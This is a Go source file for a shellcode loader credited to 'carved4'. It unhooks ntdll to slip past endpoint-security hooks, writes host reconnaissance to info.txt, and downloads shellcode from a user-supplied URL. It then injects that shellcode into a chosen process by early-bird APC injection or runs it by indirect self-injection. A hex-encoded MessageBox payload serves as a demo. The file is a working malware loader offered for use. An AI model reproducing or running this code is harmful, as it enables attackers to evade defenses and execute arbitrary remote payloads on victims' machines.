package main 

import (
    winapi "github.com/carved4/go-native-syscall"
    "rc4loader/pkg/hostinfo"
    "rc4loader/pkg/sh"
    "fmt"
    "unsafe"
    "crypto/rc4"
    "crypto/rand"
    "net/http"
    "strconv"
    "bytes"
    "io"
    "time"
    "flag"
    "os"
)

func main() {
    // parse command line flags
    demoMode := flag.Bool("demo", false, "use embedded demo shellcode (messagebox)")
    urlFlag := flag.String("url", "", "URL to download shellcode from")
    helpFlag := flag.Bool("help", false, "show usage")
    injectionMethod := flag.String("method", "earlybird", "injection method to use: 'earlybird' or 'indirect'")
    flag.Parse()
    
    // validate flags and print usage if needed
    if *helpFlag {
        fmt.Println("------------------------ rc4 loader by carved4------------------------")
        fmt.Println("  [+]                           usage                         [+]")
        fmt.Println("  [+] -demo    use embedded demo shellcode (messagebox)       [+]")
        fmt.Println("  [+] -url <url>    download shellcode from specified url     [+]")
        fmt.Println("  [+] -method <method>    injection method: earlybird/indirect[+]")
        fmt.Println("  [+]                        examples:                        [+]")
        fmt.Println("  [+]                 go run main.go -demo                    [+]")
        fmt.Println("  [+]                 go run main.go -url <url>               [+]")
        fmt.Println("  [+]                 go run main.go -demo -method indirect   [+]")
        os.Exit(1)
    }
    
    // validate injection method
    if *injectionMethod != "earlybird" && *injectionMethod != "indirect" {
        fmt.Printf("[-] Invalid injection method '%s'. Must be 'earlybird' or 'indirect'\n", *injectionMethod)
        os.Exit(1)
    }
    
    // unhook ntdll
    winapi.UnhookNtdll()
    // capture host info output
    origStdout := os.Stdout
    r, w, _ := os.Pipe()
    os.Stdout = w

    hostinfo.DemonstrateHostInfoGathering()

    w.Close()
    os.Stdout = origStdout

    // read captured output
    var buf bytes.Buffer
    io.Copy(&buf, r)

    // write to info.txt
    if err := os.WriteFile("info.txt", buf.Bytes(), 0644); err != nil {
        fmt.Printf("[-] Failed to write info.txt: %v\n", err)
    }
    fmt.Println("[+] unhooked ntdll and gathered host info (check info.txt :3) [+]")
    

    fmt.Println("[+] using RC4 encryption with random key generation [+]")
    
    // get shellcode based on mode
    var originalShellcode []byte
    var err error
    
    if *demoMode {
        fmt.Println("[+] using embedded demo shellcode (messagebox) [+]")
        originalShellcode = getEmbeddedShellcode()
    } else {
        fmt.Printf("[+] downloading shellcode from: %s [+]\n", *urlFlag)
        originalShellcode, err = downloadPayload(*urlFlag)
        if err != nil {
            fmt.Printf("failed to download payload: %v\n", err)
            return
        }
    }
    
    fmt.Printf("[+] original shellcode size: %d bytes [+]\n", len(originalShellcode))
    
    // generate random RC4 key
    fmt.Print("[+] generating random RC4 key... [+]")
    key := make([]byte, 32) // 256-bit key
    n, err := rand.Read(key)
    if err != nil || n != 32 {
        fmt.Printf("failed to generate random key: %v\n", err)
        return
    }
    fmt.Printf("[+] success, %d bytes [+]\n", len(key))
    fmt.Printf("[+] key (hex): %x [+]\n", key)
    
    // encrypt shellcode
    fmt.Print("[+] encrypting shellcode with RC4... [+]\n")
    cipher, err := rc4.NewCipher(key)
    if err != nil {
        fmt.Printf("failed to create RC4 cipher: %v\n", err)
        return
    }
    
    encryptedShellcode := make([]byte, len(originalShellcode))
    cipher.XORKeyStream(encryptedShellcode, originalShellcode)
    fmt.Printf("[+] success, %d bytes encrypted [+]\n", len(encryptedShellcode))
    
    // this is not really useful to the loader, it's more for demo purposes because I find it cool :3
    fmt.Print("[+] encoding pointer to encrypted shellcode... [+]\n")
    encodedPtr, err := winapi.CallNtdllFunction("RtlEncodeSystemPointer", uintptr(unsafe.Pointer(&encryptedShellcode[0])))
    if err != nil {
        fmt.Printf("failed: %v\n", err)
        return
    }
    fmt.Printf("[+] success, encoded: 0x%016x [+]\n", encodedPtr)
    
    // this is also not useful to the loader and just cool to me
    fmt.Print("[+] decoding system pointer... [+]\n")
    decodedPtr, err := winapi.CallNtdllFunction("RtlDecodeSystemPointer", encodedPtr)
    if err != nil {
        fmt.Printf("failed: %v\n", err)
        return
    }
    fmt.Printf("[+] success, decoded: 0x%016x [+]\n", decodedPtr)
    
    // decrypt shellcode
    fmt.Print("[+] decrypting shellcode with RC4... [+]\n")
    cipher2, err := rc4.NewCipher(key) // need fresh cipher for decryption
    if err != nil {
        fmt.Printf("failed to create RC4 cipher: %v\n", err)
        return
    }
    
    decryptedShellcode := make([]byte, len(encryptedShellcode))
    cipher2.XORKeyStream(decryptedShellcode, encryptedShellcode)
    fmt.Printf("[+] success, %d bytes decrypted [+]\n", len(decryptedShellcode))
    
    // verify decryption worked
    matches := true
    for i := 0; i < len(originalShellcode); i++ {
        if originalShellcode[i] != decryptedShellcode[i] {
            matches = false
            break
        }
    }
    
    if matches {
        fmt.Println("[+] shellcode decryption verified successfully [+]")
        
        var targetPID uint32
        var err error
        
        // Only select target process for earlybird injection
        if *injectionMethod == "earlybird" {
            fmt.Printf("[+] selecting target process for injection... [+]\n")
            targetPID, err = sh.SelectTargetProcess()
            if err != nil {
                fmt.Printf("[-] process selection failed: %v [+]\n", err)
                return
            }
        }
        
        // retry shellcode injection with multiple attempts
        maxRetries := 10
        for attempt := 1; attempt <= maxRetries; attempt++ {
            if *injectionMethod == "earlybird" {
                fmt.Printf("[+] executing decrypted shellcode into PID %d (attempt %d/%d) using %s method... [+]\n", 
                    targetPID, attempt, maxRetries, *injectionMethod)
            } else {
                fmt.Printf("[+] executing decrypted shellcode using %s method (attempt %d/%d)... [+]\n",
                    *injectionMethod, attempt, maxRetries)
            }
            
            var err error
            if *injectionMethod == "earlybird" {
                err = sh.NtInjectEarlyBird(targetPID, decryptedShellcode)
            } else {
                err = winapi.NtInjectSelfShellcodeIndirect(decryptedShellcode)
            }

            if err != nil {
                if *injectionMethod == "earlybird" {
                    fmt.Printf("[-] shellcode injection failed on attempt %d: %v\n", attempt, err)
                    if attempt < maxRetries {
                        fmt.Printf("[+] retrying same PID %d in 1 second... [+]\n", targetPID)
                        time.Sleep(1 * time.Second)
                        continue
                    } else {
                        fmt.Printf("[-] all %d injection attempts into PID %d failed [+]\n", maxRetries, targetPID)
                        return
                    }
                } else {
                    fmt.Printf("[-] self-injection failed on attempt %d: %v\n", attempt, err)
                    if attempt < maxRetries {
                        fmt.Printf("[+] retrying self-injection in 1 second... [+]\n")
                        time.Sleep(1 * time.Second)
                        continue
                    } else {
                        fmt.Printf("[-] all %d self-injection attempts failed [+]\n", maxRetries)
                        return
                    }
                }
            } else {
                if *injectionMethod == "earlybird" {
                    fmt.Printf("[+] shellcode injection into PID %d successful on attempt %d [+]\n", targetPID, attempt)
                } else {
                    fmt.Printf("[+] self-injection successful on attempt %d [+]\n", attempt)
                }
                break
            }
        }
    } else {
        fmt.Println("[-] shellcode decryption failed! [-]")
        fmt.Printf("original first 16 bytes: %x [-]\n", originalShellcode[:16])
        fmt.Printf("decrypted first 16 bytes: %x [-]\n", decryptedShellcode[:16])
    }
    
    fmt.Println("[+] test completed successfully! [+]")
}

func downloadPayload(url string) ([]byte, error) {
	// create HTTP client with reasonable timeout
	client := &http.Client{
		Timeout: 30 * 1000000000, // 30 seconds
	}
	
	// make the request
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("failed to download payload: %v", err)
	}
	defer resp.Body.Close()
	
	// check response code
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}
	
	// read the payload
	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %v", err)
	}
	
	fmt.Printf("Downloaded %d bytes of shellcode [-]\n", len(payload))
	return payload, nil
}

// messagebox shellcode for demo mode
func getEmbeddedShellcode() []byte {
	hexString := "4883ec284883e4f0488d1566000000488d0d52000000e89e0000004c8bf8488d0d5d000000ffd0488d155f000000488d0d4d000000e87f0000004d33c94c8d0561000000488d154e0000004833c9ffd0488d1556000000488d0d0a000000e8560000004833c9ffd04b45524e454c33322e444c4c004c6f61644c69627261727941005553455233322e444c4c004d657373616765426f784100636172766564202d206869004d657373616765004578697450726f63657373004883ec28654c8b0425600000004d8b40184d8d60104d8b0424fc498b7860488bf1ac84c074268a2780fc617c0380ec203ae0750848ffc748ffc7ebe54d8b004d3bc475d64833c0e9a7000000498b5830448b4b3c4c03cb4981c188000000458b294d85ed75084833c0e9850000004e8d042b458b71044d03f5418b4818458b50204c03d3ffc94d8d0c8a418b394803fb488bf2a675088a0684c07409ebf5e2e64833c0eb4e458b48244c03cb66418b0c49458b481c4c03cb418b0489493bc57c2f493bc6732a488d3418488d7c24304c8be7a4803e2e75faa4c707444c4c00498bcc41ffd7498bcc488bd6e914ffffff4803c34883c428c3"

	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}